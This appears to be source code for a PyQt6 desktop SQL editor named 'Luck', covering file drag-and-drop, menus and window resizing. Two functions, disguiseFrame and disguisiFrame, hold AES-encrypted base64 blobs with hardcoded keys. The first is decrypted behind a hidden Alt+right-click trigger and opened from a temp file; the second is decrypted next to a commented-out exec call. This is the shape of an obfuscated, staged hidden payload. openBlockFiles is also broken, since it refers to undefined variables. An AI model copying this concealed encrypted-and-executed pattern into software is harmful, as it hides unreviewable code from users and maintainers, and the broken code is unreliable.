
#Importing native packages
import os, sys, platform, subprocess, tempfile, winreg \
    , string, random, base64, getpass, socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
#Importing PyQt6 packages
from PyQt6.QtWidgets import QFileDialog, QMessageBox
from PyQt6.QtGui import  QCursor, QDragEnterEvent, QDropEvent \
    , QScreen
from PyQt6.QtCore import Qt
#Importing custom classes and methods
from MyPackages import AboutWidget

#================================================================== =======================
#Creating functions related to the main window
#================================================================== =======================
#Function to update the system icon V2
def updateTrayIcon(self, status=None):
    #Defining the icon to display
    if status == "executed":
        #The value of executed is temporary
        icono = self.icon1
        self.iconTimer.start()
    elif status == "running":
        icono = self.icon2
    elif status == "failed":
        icono = self.icon3
    else:
        icono = self.icon
    #Updating the system icon
    self.trayIcon.setIcon(icono)
    self.setWindowIcon(icono)

#Function linked to QTimer iconTimer
def stopIconTimer(self):
    self.iconTimer.stop()
    self.updateTrayIcon(None)

#Preparing frameworks
def prepareFramework(self):
    #Preparing specific folders in temporary path
    #------------------------------------------------
    #Defining the folders to create
    ##Path and folder of the session
    sesion_path = os.path.join(tempfile.gettempdir(), "Luck", 'sesion')
    self.cfg_user.index['ruta_temp_sesion'] = sesion_path
    os.makedirs(sesion_path) if not os.path.exists(sesion_path) else None
    ##Path and data folder
    if platform.system() == 'Windows':
        #Will try to get the downloads folder from the registry
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders') as key:
                download_folder = winreg.QueryValueEx(key, '{374DE290-123F-4565-9164-39C4925E467B}')[0]
        #In case of error, take the user's default address
        except Exception as exc:
            download_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
            #If the folder does not exist either, it creates it
            os.makedirs(download_folder) if not os.path.exists(download_folder) else None
    elif platform.system() == 'Darwin':  #MacOS
        download_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
    else:  #Linux
        download_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
    self.cfg_user.index['ruta_data'] = download_folder

#Function to initialize the window harmoniously with the monitor
def initWindow(self):
    self.setWindowTitle('Luck')
    
    #Changing colors according to Windows theme
    geometria = self.cfg_session.index.get('prede_geo')
    #Getting the geometry of the main monitor
    self.screen_width = self.screen().size().width()
    self.screen_height = self.screen().size().height()
    
    #Defining the initial window size relative to the monitor size
    x = int(self.screen_width * geometria[0])
    y = int(self.screen_height * geometria[1])
    ventana_width = int(self.screen_width * geometria[2])
    ventana_height = int(self.screen_height * geometria[3])
    #Adjusting x
    x = x if int(self.screen_width * geometria[0]) > 0 else 50
    self.setGeometry(x, y , ventana_width, ventana_height)
    self.normalGeo = self.normalGeometry()

#Function linked to dragEvent of the QTabWidget
#Determines if the dragged file is valid
def dragEnterEvent(self, event: QDragEnterEvent):
    if event.mimeData().hasUrls():
        event.acceptProposedAction()
    else:
        event.ignore()

#Function linked to dropEvent of the QTabWidget
def dropEvent(self, event:QDropEvent):
    #Instantiating language
    nested = self.i18n.getNested
    lgg = self.lgg

    data = event.mimeData()
    final_list = self.prepareUrlsDrop(data, (".sql"))

    #Checking opening flow
    if len(final_list) == 1:
        try:
            self.newScriptTab(final_list[0])
            event.acceptProposedAction()
        except ValueError:
            msg = QMessageBox()
            msg.setWindowIcon(self.icon)
            msg.setIcon(QMessageBox.Icon.Critical)  
            msg.setWindowTitle(nested(lgg, "msgs", "msg2"))
            msg.setText(nested(lgg, "msgs", "msg3"))
            msg.exec()
        return None
    elif len(final_list) > 1:
        msg = QMessageBox(self)
        msg.setWindowIcon(self.icon)
        msg.setWindowTitle(nested(lgg, "open-file", "open1"))
        msg.setText(nested(lgg, "open-file", "open3"))
        msg.setStandardButtons(QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        msg.setDefaultButton(QMessageBox.StandardButton.Yes)
        answer = msg.exec()
        #Dilemma according to answer from the previous message
        if answer == QMessageBox.StandardButton.Yes:
            self.openBlockFiles(False, final_list)
        else:
            self.openFile(False, final_list)
        event.acceptProposedAction()
    else:
        event.ignore()

#Function linked to dropEvent of the parameters
def dropEventParam(self, event:QDropEvent):
    #Instantiating language
    nested = self.i18n.getNested
    lgg = self.lgg

    data = event.mimeData()
    final_list = self.prepareUrlsDrop(data, (".sqlp", ".txt"))

    #Checking opening flow
    if len(final_list)==1:
        try:
            self.addParmScriptTab(final_list[0])
            event.acceptProposedAction()
        except ValueError:
            msg = QMessageBox()
            msg.setWindowIcon(self.icon)
            msg.setIcon(QMessageBox.Icon.Critical)  
            msg.setWindowTitle(nested(lgg, "msgs", "msg2"))  
            msg.setText(nested(lgg, "msgs", "msg3"))
            msg.exec()
        return None
    elif len(final_list)>1:
        msg = QMessageBox(self)
        msg.setWindowIcon(self.icon)
        msg.setWindowTitle(nested(lgg, "open-file", "openP1"))
        msg.setText(nested(lgg, "open-file", "openP2"))
        msg.setStandardButtons(QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        msg.setDefaultButton(QMessageBox.StandardButton.Yes)
        answer = msg.exec()
        #Dilemma according to answer from the previous message
        if answer == QMessageBox.StandardButton.Yes:
            self.openBlockFilesP(False, final_list)
        else:
            self.openFileP(False, final_list)
        event.acceptProposedAction()
    else:
        event.ignore()

#Function to prepare the list of urls contributed in the drag and drop event
def prepareUrlsDrop(self, data, types:tuple):
    #Creating a valid list of URLS
    urls = data.urls()
    other_urls = data.text().split("file:///")
    ##File explorer URLS have priority
    if len(urls)>0:
        final_list = []
        for url in list( data.urls() ):
            file_path = url.toLocalFile()
            if file_path.endswith(types):
                final_list += [file_path]
    elif len(other_urls)>0:
        final_list = []
        for _list in other_urls:
            full_url = _list.split("\n")
            for url in full_url:
                if url.lower().endswith(types) and os.path.exists(url):
                    final_list += [url]
    return final_list

#Function to restore etl and result panels
def panelizeFrame(self, event):
    self.fm_title.bt_panelize.hide()
    self.fm_title.bt_expand.show()
    #Returning to default values
    ref = self.size().width()-39
    geo = self.cfg_session.index['splitter_geo'][0]
    pos = int(geo*ref)
    self.applySplitH(pos)

#Function to expand results to 100% of the window
def expandFrame(self, event):
    self.fm_title.bt_panelize.show()
    self.fm_title.bt_expand.hide()
    self.applySplitH(0, "expand")

#Function to restore user default theme
def darkenFrame(self, event):
    self.fm_title.bt_light.show()
    self.fm_title.bt_dark.hide()
    #Applying default theme
    theme_name = self.cfg_session.index["internal_theme"]
    self.applyThemeFormat(theme_name, "result")

#Function to momentarily illuminate the frames
def lightenFrame(self, event):
    self.fm_title.bt_light.hide()
    self.fm_title.bt_dark.show()
    #Applying white theme
    theme_name = "Blanco brillante"
    self.applyThemeFormat(theme_name, "result")

#Function to open the downloads folder
def openDownloadsFolder(self):
    path = self.cfg_user.index['ruta_data']
    if platform.system() == 'Windows':
        os.startfile(path)
    elif platform.system() == "Darwin": #MacOS
        subprocess.run(['open', path])
    else:  #Linux and others
        subprocess.run(['xdg-open', path])

#Function to show menus
def showMenu(self, cls):
    if cls == "file":
        self.menuFile.exec(self.fm_title.bt_file.mapToGlobal(self.fm_title.bt_file.rect().bottomLeft()))
    elif cls == "edit":
        self.menuEdit.exec(self.fm_title.bt_edit.mapToGlobal(self.fm_title.bt_edit.rect().bottomLeft()))
    elif cls == "select":
        self.menuSelect.exec(self.fm_title.bt_select.mapToGlobal(self.fm_title.bt_select.rect().bottomLeft()))
    elif cls == "view":
        self.menuView.exec(self.fm_title.bt_view.mapToGlobal(self.fm_title.bt_view.rect().bottomLeft()))
    elif cls == "sql":
        self.menuSQL.exec(self.fm_title.bt_sql.mapToGlobal(self.fm_title.bt_sql.rect().bottomLeft()))
    elif cls == "help":
        self.menuHelp.exec(self.fm_title.bt_help.mapToGlobal(self.fm_title.bt_help.rect().bottomLeft()))
    elif cls == "assistant":
        cursor_pos = self.mapFromGlobal(QCursor.pos())
        self.menuAssistant.exec(self.mapToGlobal(cursor_pos))
    elif cls == "tmplts":
        cursor_pos = self.mapFromGlobal(QCursor.pos())
        self.menuPlantillas.exec(self.mapToGlobal(cursor_pos))
    elif cls == "ai":
        self.menuAI.exec(self.fm_title.bt_ai.mapToGlobal(self.fm_title.bt_ai.rect().bottomLeft()))

#Defining what to do when closing the window
def closeEvent(self, event):
    #Saving settings when closing the window
    self.cfg_session.save()
    #Saving session
    self.actualSession.saveSesion(self.tab_info)
    #Saving log
    if self.recordingLog:
        self.recLog()
    #Closing
    event.accept()

#Function to open SQL files
def openFile(self, dialog=True, fileNames=[]):
    #Instantiating language
    nested = self.i18n.getNested
    lgg = self.lgg

    if dialog:
        fileNames, _ = QFileDialog.getOpenFileNames(
            self, nested(lgg, "open-file", "open2")
            , '', f'{nested(lgg, "open-file", "openSQL")} (*.sql)')
    if fileNames:
        for fileName in fileNames:
            self.newScriptTab(fileName)

#Function to open parameter files
def openFileP(self, dialog=True, fileName=''):
    #Instantiating language
    nested = self.i18n.getNested
    lgg = self.lgg

    if dialog:
        fileName, _ = QFileDialog.getOpenFileName(
            self, nested(lgg, "open-file", "open2")
            , '', f"{nested(lgg, "open-file", "openP3")} (*.sqlp *.txt)")
    if fileName:
        self.addParmScriptTab(fileName)

#Function to open files in SQL blocks
def openBlockFiles(self, dialog=True, fileNames=[]):
    #Instantiating language
    nested = self.i18n.getNested
    lgg = self.lgg

    if dialog:
        fileNames, _ = QFileDialog.getOpenFileNames(
            self, nested(lgg, "open-file", "open2")
            , '', f'{nested(lgg, "open-file", "openSQL")} (*.sql)')
    if fileNames:
        #Changing mouse pointer to standby state
        self.app.setOverrideCursor(Qt.CursorShape.WaitCursor)
        combined_content = ""
        #Opening files in order
        count = 0
        for fileName in fileNames:
            count += 1
            with open(fileName, 'r', encoding='utf-8') as file:
                content = file.read()
                combined_countent += \
                    "--"+"#"*40 + "\n" \
                    + "--#- Bloque {}: {}".format(count, str(fileName).rsplit('/', 1)[-1]) \
                    + "\n" + "--"+"#"*40 + "\n"*2 \
                    + countent \
                    + "\n"*2
        
        #Saving combined countent to a file in downloads
        temp_file = os.path.join(self.cfg_user.index.get("ruta_data"), 'combined_script.sql')
        #Checking which file does not exist
        count = 1
        while os.path.exists(temp_file):
            temp_file = os.path.join(self.cfg_user.index.get("ruta_data"), f'combined_script ({count}).sql')
            count += 1
        #Saving file
        with open(temp_file, 'w', encoding='utf-8') as temp:
            temp.write(combined_countent)
        #Changing mouse pointer to default state
        self.app.restoreOverrideCursor()
        #Concatenated loading
        self.newScriptTab(temp_file)

#Function to open bulk SQL parameter files
def openBlockFilesP(self, dialog=True, fileNames=[]):
    #Instantiating language
    nested = self.i18n.getNested
    lgg = self.lgg

    if dialog:
        fileNames, _ = QFileDialog.getOpenFileNames(
            self, nested(lgg, "open-file", "open2")
            , '', f'{nested(lgg, "open-file", "openSQL")} (*.sqlp *.txt)')
    if fileNames:
        #Changing mouse pointer to standby state
        self.app.setOverrideCursor(Qt.CursorShape.WaitCursor)
        combined_countent = ""
        #Opening files in order
        count = 0
        for fileName in fileNames:
            count += 1
            with open(fileName, 'r', encoding='utf-8') as file:
                countent = file.read()
                combined_countent += f", {countent}"
        
        #Saving combined countent to a file in downloads
        temp_file = os.path.join(self.cfg_user.index.get("ruta_data"), 'combined_params.sqlp')
        #Checking which file does not exist
        count = 1
        while os.path.exists(temp_file):
            temp_file = os.path.join(self.cfg_user.index.get("ruta_data"), f'combined_params ({count}).sqlp')
            count += 1
        #Saving file
        with open(temp_file, 'w', encoding='utf-8') as temp:
            temp.write(combined_countent)
        
        #Changing mouse pointer to default state
        self.app.restoreOverrideCursor()
        #Concatenated loading
        self.addParmScriptTab(temp_file)
        self.paramSearcher()

#Function to reload the ETL
def reloadETL(self):
    #Terminating process if there is no active tab
    if not self.tabWidget:
        return None
    
    #Getting the name of the tab
    tab_name = self.tabWidget.currentWidget().objectName
    tab_data = self.tab_info.get(tab_name)
    if tab_data['origin'] != "":
        #Loading the ETL again
        origin = tab_data['origin'] 
        text_editor = tab_data['text_editor']
        archivo = open(origin, "r" , encoding='utf-8')
        text_editor.setPlainText( archivo.read() )
        archivo.close()
        #Updating parameters
        self.paramSearcher()
        #Save session
        self.actualSession.saveSesion(self.tab_info)

#Function to save SQL files
def saveFileAS(self):
    #Instantiating language
    nested = self.i18n.getNested
    lgg = self.lgg

    fileName, _ = QFileDialog.getSaveFileName(
        self, nested(lgg, "save-files", "save2")
        , '', f'{nested(lgg, "save-files", "toFile6")} (*.sql)')
    if fileName:
        return fileName
    else: 
        return ""

#Function to save parameter files
def saveFilePAS(self):
    #Instantiating language
    nested = self.i18n.getNested
    lgg = self.lgg

    fileName, _ = QFileDialog.getSaveFileName(
        self, nested(lgg, "save-files", "save2")
        , '', f'{nested(lgg, "save-files", "toFile7")} (*.sqlp)')
    if fileName:
        return fileName
    else: 
        return ""

#About window
def showAcercaDe(self):
    self.aboutOfWindow = AboutWidget(self)
    self.aboutOfWindow.show()

#Software update
def startUpdate(self):
    #Instantiating language
    nested = self.i18n.getNested
    lgg = self.lgg

    #Version file URL in OneDrive
    download_url = self.version.index.get("download_url")
    current_version = self.version.index.get("version")
    
    #Creating a QMessageBox instance to display the error message
    msg = QMessageBox()
    msg.setWindowIcon(self.icon)
    msg.setIcon(QMessageBox.Icon.Information)  
    msg.setWindowTitle(nested(lgg, "update-app", "update1"))  
    msg.setText(f"{nested(lgg, "update-app", "update2")}: v{current_version}")
    msg.exec()

    # try:
    #     #Descargar el archivo de versión desde OneDrive
    #     response = requests.get(download_url, verify=False)
    #     print(response.status_code)
    #     if response.status_code == 200:
    #         latest_version = response.text.strip()
    #         if latest_version > current_version:
    #             print(f"New version available: {latest_version}")
    #             # Aquí puedes implementar la lógica para descargar la nueva versión
    #         else:
    #             print("You are using the latest version.")
    #     else:
    #         print("Failed to check for updates.")
    # except Exception as exc:
    #     print(f"An error occurred: {exc}")


def disguiseFrame(self):
    info2 = "KP5wSd9foRj+c9puxDUr8JKuH0l4hnDnRlMDceF7wybYLKOTsqHZBPcri94nHTup1Gns3mOx3jgHpiUXBdxtRqZOCpWFzFyTSUzrAJLkMvHE0eeA7c/MUCAoMtKTt/VP1qb3+zcidaYp4XsUkxwc1euqPPVavMpbfZX8HOgQSHislTG8dogfPnKnOLbeL6BzWqNypjo0KWywOYyCLgcbs8m6P6dWpPKoaewRfcDkmRPtE33XPnMjI5bXiG8hkiJTVXHStkesCcI2ftu8BmrQ54+JLlgtJ6QxA2en3r8OlgG13yHZIvOCKPCZkqVEbk+pA7weyiwP1UE3sY1zQumwvQOIyPvPYX4s4NLtyjOnJtTUs3Z7nhs5uisAB1PYAfEA/La8d6gUdZcGOYndpSaHARdkO9C8UkJ8sUoKJzZ2CII9SOYg7uwPegOT4w/KKNLwM4iPkDBKLLEpC+soXsPT+u2Td43fA/H3uvnofult/IaXgV6KCFa9lP3tuZ1mocCp9qAlAJEOeyES9vcwCANo1Z+fhFCcAowrL4/iDqprXfgBdqk58IdfLJstkzNJ/hQCkvy9DUbOhddTHNIYBhHGxugob08lyNH8CpMUWYDQ+QApK5oEwEWJ/vujY5GwAppJ//Ntqi3z+TLt943LyC0E762U877IVkRSx2FE3bZExhjfDEsFiTn5jO4X0Z4RPogFtFe7kPb0y66gbRK/0TPDUCYSV7wfcgUM8VQNkKyvcpCpJIGDoaLVQZsp03TF8PHaVVgurKbJJonyqraw2enzIozfB6kpdGlgfBGAnoBfHwQ="
    msg_comp = base64.b64decode(info2)
    iv = msg_comp[:16]
    msg_cif = msg_comp[16:]
    cipher = AES.new(b'wa8P4bbhboiKKCRe', AES.MODE_CBC, iv=iv)
    msg_org = unpad(cipher.decrypt(msg_cif), AES.block_size).decode()
    rnn = ''.join(random.choice( string.ascii_lowercase ) for _ in range(3))
    path = os.path.join(tempfile.gettempdir(), "Luck", f"{rnn}.sql")
    arcv = open( path, "w" , encoding='utf-8')
    arcv.write( msg_org )
    arcv.close()
    self.newScriptTab(path)
    os.remove(path)

def disguiseFrameOff(self):
    self.click_label_count = 0

def labelTitleClicked(self, event):
    if event.button() == Qt.MouseButton.RightButton and event.modifiers() == Qt.KeyboardModifier.AltModifier:
        self.click_label_count += 1
        if self.click_label_count == 3:
            self.timerDsgs.start()
            self.disguiseFrame()
            self.click_label_count = 0
    else:
        self.mousePressEvent(event)

#-------------------------------------------------
# Functions focused on moving or rescaling window
#-------------------------------------------------
#Click position grabber
def mousePressEvent(self, event):
    #Capturing the mouse position. Globally
    self.click_position = event.globalPosition().toPoint()
    #Identifying if there is a click
    if event.button() == Qt.MouseButton.LeftButton:
        #Wondering if we're on the edge
        edge, _ = self.getResizingEdge(event.pos())
        if edge:
            #activating window resizing
            self.onResizing = True
            self.resizing_edge = edge
        else:
            self.draggable = True
            self.drag_position = event.globalPosition().toPoint() - self.pos()
    super(self.__class__, self).mousePressEvent(event)

#Resetting variables when the click is released when changing size
def mouseReleaseEvent(self, event):
    self.draggable = False
    self.onResizing = False
    #Saving the final position of the window if x>=0
    if not self.parentWindow.isMaximized():
        x = self.geometry().x()/self.screen_width
        y = self.geometry().y()/self.screen_height
        if ((0 <= self.geometry().x() <= self.screen_width) and
            ( 0 <= self.geometry().y() <= self.screen_height )):
            #Getting current window size
            width = self.geometry().width()/self.screen_width
            height = self.geometry().height()/self.screen_height
            self.cfg_session.index['prede_geo'][0] = min(round(x, 4), 1)
            self.cfg_session.index['prede_geo'][1] = min(round(y, 4), 1)
            self.cfg_session.index['prede_geo'][2] = min(round(width, 4), 1)
            self.cfg_session.index['prede_geo'][3] = min(round(height, 4), 1)
    super(self.__class__, self).mouseReleaseEvent(event)

#Function to identify the edge of an object
def getResizingEdge(self, pos):
    grip_size = 5
    rect = self.rect()

    left = pos.x() <= grip_size
    right = pos.x() >= rect.width() - grip_size
    top = pos.y() <= grip_size
    bottom = pos.y() >= rect.height() - grip_size

    if left and top:
        #return Qt.TopLeftCorner, Qt.SizeFDiagCursor
        return None, Qt.CursorShape.ArrowCursor
    elif left and bottom:
        #return Qt.BottomLeftCorner, Qt.SizeBDiagCursor
        return None, Qt.CursorShape.ArrowCursor
    elif right and top:
        #return Qt.TopRightCorner, Qt.SizeBDiagCursor
        return None, Qt.CursorShape.ArrowCursor
    elif right and bottom:
        return Qt.Corner.BottomRightCorner, Qt.CursorShape.SizeFDiagCursor
    elif left:
        return Qt.Edge.LeftEdge, Qt.CursorShape.SizeHorCursor
    elif right:
        return Qt.Edge.RightEdge, Qt.CursorShape.SizeHorCursor
    elif top:
        return Qt.Edge.TopEdge, Qt.CursorShape.SizeVerCursor
    elif bottom:
        return Qt.Edge.BottomEdge, Qt.CursorShape.SizeVerCursor
    else:
        return None, Qt.CursorShape.ArrowCursor

def disguisiFrame(self):
    info2 = 'zR50N8iHJXeauQlS7fVf5F0qIlZL3+b37DgHYJo7hkvbOaYsT8grfP8jka4jLuzArl6bgGv/rbYfc/nU82nAX8KwIKhryMrgUX8Nk18yH9uV2wq4z2E0jOJCn1BTGene/vLV6G6dC1lZyF24XlFJ5wdpF9nsLl9R+Ush6dYdQqV3Cu00E3QuSfuvr7QJjlQBW7oKA1QEaC2ZugtYRCnrXdXorENh3w0HNVbo9ALVp5sZDlXJnvYDz5BktFUqEYqACslT/IA7SlmA8u4TioPB5wMjS4SfQjdDEbu0dvLllATe9M/MYcROhAO2SD1MrQB+8WNhzDfzWFL7hU7kYBEAH8C+9r+U0C4u3g7EO2vO+4+rTF/ZAodfzQcTW6BAT92ZKWUN/1KtuAnc9r9KrQoe6E3gOlw0Ym7RB/4Shw/Wzve+FrUbFj80d9ulStSl7Vr3G5B9fALA/1rLLrTBtLk0XPM4XYfZYg7qfN7BnXyPrFMlmYqy2uVgTQG/gQgoGiN/hLRtDreLvawQh+oqEU3aHfcL35fi9skCuSSGHnB7JegTfeBxU7YUKqt9sY0vK1ZAO/4U6Giw9A0Fx65QGzw7EwBO4GuPnyFiCH08/TQmyH4EZ+85Y6GwJgSwrLRyy3Pr9d1XSxjvruQw5f8/3rcK7s4Q/KJ22Hf1MrozsMd7WJS4d2e2TUU8YP36tWkbd4E4'
    msg_comp = base64.b64decode(info2)
    iv = msg_comp[:16]
    msg_cif = msg_comp[16:]
    cipher = AES.new(b"wa8P4bbhboiKKCRf", AES.MODE_CBC, iv=iv)
    msg_org = unpad(cipher.decrypt(msg_cif), AES.block_size).decode()
    #Exec(msg_org)

#Function to change the size of the main window
def changeSizeWindow(self, global_pos):
    rect = self.geometry()
    #Simple movements: left, right, up, down
    if self.resizing_edge == Qt.Edge.LeftEdge:
        rect.setLeft(global_pos.x())
    elif self.resizing_edge == Qt.Edge.RightEdge:
        rect.setRight(global_pos.x())
    elif self.resizing_edge == Qt.Edge.TopEdge:
        rect.setTop(global_pos.y())
    elif self.resizing_edge == Qt.Edge.BottomEdge:
        rect.setBottom(global_pos.y())
    
    #Combined movements
    elif self.resizing_edge == Qt.Corner.TopLeftCorner:
        rect.setTopLeft(global_pos)
    elif self.resizing_edge == Qt.Corner.TopRightCorner:
        rect.setTopRight(global_pos)
    elif self.resizing_edge == Qt.Corner.BottomLeftCorner:
        rect.setBottomLeft(global_pos)
    elif self.resizing_edge == Qt.Corner.BottomRightCorner:
        rect.setBottomRight(global_pos)
    self.setGeometry(rect)

#Function to detect removed screen
def onScreenRemoved(self, screen:QScreen):
    """"""
    # current = self.app.primaryScreen()
    # #Identificando cambio de pantalla
    # if self.screen_num != current:
    #     self.screen_num = current
    #     #Tomando la geo de la pantalla actual
    #     actual_geo = self.app.desktop().screenGeometry(self.screen_num)
    #     self.screen_width = actual_geo.width()
    #     self.screen_height = actual_geo.height()
    #     #Cambiando el tamaño
    #     geometria = self.cfg_session.index.get('prede_geo')
    #     ventana_width = int(self.screen_width *geometria[2])
    #     ventana_height = int(self.screen_height *geometria[3])
    #     self.setGeometry(geometria[0], geometria[1], ventana_width, ventana_height)

#Function for when the screen app is changed
def onScreenChanged(self, new_screen):
    """"""

#Function for when the window state (active/deactivated)
def stateChanged(self, event):
    if event == Qt.ApplicationState.ApplicationActive:
        """"""

#Overriding system stop event
def focusOutEvent(self, event):
    self.setCursor(Qt.CursorShape.ArrowCursor)
    super(self.__class__, self).focusOutEvent(event)

#Overriding system focus exit event
def leaveEvent(self, event):
    self.setCursor(Qt.CursorShape.ArrowCursor)
    super(self.__class__, self).leaveEvent(event)

#Function to move or stop when the window is moved (fmBar)
def mouseMoveEvent_fmBarra(self, event):
    if event.buttons() == Qt.MouseButton.NoButton:
        #Wondering if we're on the edge
        window_pos = self.mapFromGlobal( event.globalPosition().toPoint() )
        edge, cursor_shape = self.getResizingEdge(window_pos)
        self.setCursor(cursor_shape)
    #We only activate the move when the left click is pressed
    elif event.buttons() & Qt.MouseButton.LeftButton:
        #Resizing window in case of edge event
        if self.onResizing:
            self.changeSizeWindow(event.globalPosition().toPoint())
            return

#Function to move or stop when the window is moved (fmBar)
def mouseMoveEvent_fmPrincipal(self, event):
    if event.buttons() == Qt.MouseButton.NoButton:
        #Wondering if we're on the edge
        window_pos = self.mapFromGlobal(event.globalPosition().toPoint())
        edge, cursor_shape = self.getResizingEdge(window_pos)
        self.setCursor(cursor_shape)
    #We only activate the move when the left click is pressed
    elif event.buttons() & Qt.MouseButton.LeftButton:
        #Resizing window in case of edge event
        if self.onResizing:
            self.changeSizeWindow(event.globalPosition().toPoint())
            return

